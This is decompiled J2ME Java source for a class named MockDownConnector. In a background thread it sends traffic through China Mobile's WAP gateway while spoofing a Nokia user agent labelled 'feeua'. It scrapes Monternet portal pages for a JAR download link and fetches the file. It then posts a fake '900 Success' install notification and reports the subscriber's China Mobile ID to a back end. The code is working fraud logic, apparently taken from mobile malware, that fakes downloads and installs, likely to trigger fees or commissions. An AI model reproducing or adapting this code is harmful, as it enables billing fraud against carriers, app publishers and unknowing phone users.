// Decompiled with: Procyon 0.5.36
// Class Version: 1
package network;

import java.io.OutputStream;
import java.io.InputStream;
import javax.microedition.io.Connector;
import javax.microedition.io.HttpConnection;
import java.io.ByteArrayOutputStream;
import base.Param;
import means.DebugFrame;

public class MockDownConnector implements Runnable
{
    private String url;
    private String mobileType;
    private int jarSize;
    private String jarName;
    private String feeua;
    private boolean isRunning;
    String downURL;
    String downHost;
    String pageHost;
    
    public MockDownConnector(final String jarName, final String url, final String mobileType, final int jarSize) {
        this.feeua = "NokiaE52/2.0617.1.0.3 series60/2.8 profile/midp-2.0 configuration/cldc-1.1";
        this.isRunning = false;
        this.downURL = null;
        this.downHost = "gmp.i139.cn";
        this.pageHost = "gamepie.g188.net";
        if (url != null) {
            this.jarName = jarName;
            this.url = url;
            this.mobileType = mobileType;
            this.jarSize = jarSize;
            if (!this.isRunning) {
                new Thread(this).start();
            }
        }
    }
    
    public void run() {
        this.isRunning = true;
        try {
            this.httpProc("http://xdown.monternet.com/", null, false, null);
            DebugFrame.getInstance().logIn("下载JAR_NAME" + this.jarName);
            DebugFrame.getInstance().logIn("下载JAR_URL" + this.url);
            final String httpProc = this.httpProc(this.url, null, true, null);
            final String string = "href=\"http://" + this.pageHost + "/";
            final String s = "\"";
            if (httpProc != null && httpProc.indexOf(string) != -1 && httpProc.indexOf(s) != -1) {
                this.downURL = "http://" + this.pageHost + "/" + this.subStringBetween(httpProc, string, s);
            }
            else {
                this.downURL = this.url;
            }
            final String httpProc2 = this.httpProc(this.downURL, null, true, null);
            final String string2 = "<a href=\"http://" + this.downHost + "/";
            final String s2 = "\">";
            if (httpProc2 != null && httpProc2.indexOf(string2) != -1 && httpProc2.indexOf(s2) != -1) {
                this.downURL = "http://" + this.downHost + "/" + this.subStringBetween(httpProc2, string2, s2);
                this.downURL = this.replaceAll(this.downURL, "&amp;", "&");
                DebugFrame.getInstance().logIn("下载地址二:" + this.downURL);
            }
            DebugFrame.getInstance().logIn("解析地址二完毕");
            if (this.downURL != null && this.downURL.indexOf("&uaStr=") != -1 && this.downURL.indexOf("&key") != -1) {
                this.downURL = this.replaceAll(this.downURL, this.subStringBetween(this.downURL, "&uaStr=", "&key"), this.mobileType);
                final String httpProc3 = this.httpProc(this.downURL, null, true, null);
                DebugFrame.getInstance().logIn("处理后下载地址:" + httpProc3);
                final String httpProc4 = this.httpProc(httpProc3, null, true, null);
                if (httpProc4.indexOf("MIDlet") != -1) {
                    final String subStringBetween = this.subStringBetween(httpProc4, "MIDlet-Jar-URL: ", "\r");
                    this.subStringBetween(httpProc4, "MIDlet-Jar-Size: ", "\r");
                    final String subStringBetween2 = this.subStringBetween(httpProc4, "MIDlet-Install-Notify: ", "\r");
                    DebugFrame.getInstance().logIn("JAR SIZE 大小：" + httpProc4);
                    DebugFrame.getInstance().logIn("下载JAR");
                    if (this.httpProc(subStringBetween, null, false, null).getBytes().length >= 256) {
                        DebugFrame.getInstance().logIn("下载大小：" + httpProc4);
                    }
                    DebugFrame.getInstance().logIn("下载完成：");
                    this.httpProc(subStringBetween2, null, false, "900 Success");
                    DebugFrame.getInstance().logIn("Notify连接成功");
                    NetSend.getInstance().sendDownJarState(Param.chinaMobileUserID, this.jarName);
                }
                else {
                    DebugFrame.getInstance().logIn("无匹配MIDlet");
                }
            }
        }
        catch (Exception ex) {
            ex.printStackTrace();
            this.isRunning = false;
        }
        this.isRunning = false;
    }
    
    private String httpProc(String string, final String s, final boolean b, final String s2) {
        String headerField = "";
        final byte[] array = new byte[512];
        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        InputStream openInputStream = null;
        HttpConnection httpConnection = null;
        try {
            String s3 = null;
            if (string != null) {
                if (string.startsWith("http://")) {
                    s3 = string.substring("http://".length(), string.length());
                }
                else {
                    s3 = string;
                }
                final int index = s3.indexOf("/");
                String substring;
                if (index != -1) {
                    substring = s3.substring(index, s3.length());
                    s3 = s3.substring(0, index);
                }
                else {
                    substring = "/";
                }
                string = "http://10.0.0.172:80" + substring;
            }
            httpConnection = (HttpConnection)Connector.open(string, 3, true);
            httpConnection.setRequestProperty("X-Online-Host", s3);
            httpConnection.setRequestProperty("user-agent", this.feeua);
            if (s != null) {
                httpConnection.setRequestProperty("referer", s);
            }
            if (s2 == null) {
                httpConnection.setRequestMethod("GET");
            }
            else {
                httpConnection.setRequestMethod("POST");
                httpConnection.setRequestProperty("content-type", "text/plain");
                httpConnection.setRequestProperty("content-length", String.valueOf(s2.length()));
                final OutputStream openOutputStream = httpConnection.openOutputStream();
                openOutputStream.write(s2.getBytes());
                openOutputStream.close();
            }
            openInputStream = httpConnection.openInputStream();
            DebugFrame.getInstance().logIn("JAR_SIZE:" + this.jarSize);
            int read;
            while ((read = openInputStream.read(array)) != -1) {
                if (!b && byteArrayOutputStream.size() > this.jarSize) {
                    DebugFrame.getInstance().logIn("结束下载");
                    break;
                }
                byteArrayOutputStream.write(array, 0, read);
                DebugFrame.getInstance().logIn("baos size:" + byteArrayOutputStream.size());
            }
            if (httpConnection.getResponseCode() == 302) {
                headerField = httpConnection.getHeaderField("Location");
                DebugFrame.getInstance().logIn("RD:" + headerField);
                DebugFrame.getInstance().logIn("302 跳转");
                return headerField;
            }
            headerField = new String(byteArrayOutputStream.toByteArray());
        }
        catch (Exception ex) {
            ex.printStackTrace();
            this.isRunning = false;
            try {
                if (byteArrayOutputStream != null) {
                    byteArrayOutputStream.close();
                }
                if (openInputStream != null) {
                    openInputStream.close();
                }
                if (httpConnection != null) {
                    httpConnection.close();
                }
            }
            catch (Exception ex2) {
                this.isRunning = false;
                ex2.printStackTrace();
            }
            return headerField;
        }
        finally {
            try {
                if (byteArrayOutputStream != null) {
                    byteArrayOutputStream.close();
                }
                if (openInputStream != null) {
                    openInputStream.close();
                }
                if (httpConnection != null) {
                    httpConnection.close();
                }
            }
            catch (Exception ex3) {
                this.isRunning = false;
                ex3.printStackTrace();
            }
        }
        try {
            if (byteArrayOutputStream != null) {
                byteArrayOutputStream.close();
            }
            if (openInputStream != null) {
                openInputStream.close();
            }
            if (httpConnection != null) {
                httpConnection.close();
            }
        }
        catch (Exception ex4) {
            this.isRunning = false;
            ex4.printStackTrace();
        }
        return headerField;
    }
    
    private String subStringBetween(final String s, final String s2, final String s3) {
        if (s == null || s2 == null || s3 == null) {
            return null;
        }
        final int index = s.indexOf(s2);
        if (index == -1) {
            return null;
        }
        final int index2 = s.indexOf(s3, index + s2.length());
        if (index2 != -1) {
            return s.substring(index + s2.length(), index2);
        }
        return s.substring(index + s2.length());
    }
    
    private String[] split(final String s, final String s2) {
        if (s == null || s2 == null) {
            return null;
        }
        int i = s.indexOf(s2);
        int n = 1;
        while (i != -1) {
            ++n;
            i = s.indexOf(s2, i + s2.length());
        }
        final String[] array = new String[n];
        int index = s.indexOf(s2);
        array[0] = s.substring(0, index);
        int n2 = 1;
        for (int j = 1; j < array.length - 1; ++j) {
            final int index2 = s.indexOf(s2, index + s2.length());
            if (index2 != -1) {
                array[n2] = s.substring(index + s2.length(), index2);
            }
            ++n2;
            index = index2;
        }
        array[array.length - 1] = s.substring(index);
        return array;
    }
    
    private String replaceAll(String substring, final String s, final String s2) {
        final StringBuffer sb = new StringBuffer();
        int index;
        while ((index = substring.indexOf(s)) > 0) {
            sb.append(substring.substring(0, index));
            substring = substring.substring(index + s.length(), substring.length());
            sb.append(s2);
        }
        sb.append(substring);
        return sb.toString();
    }
}
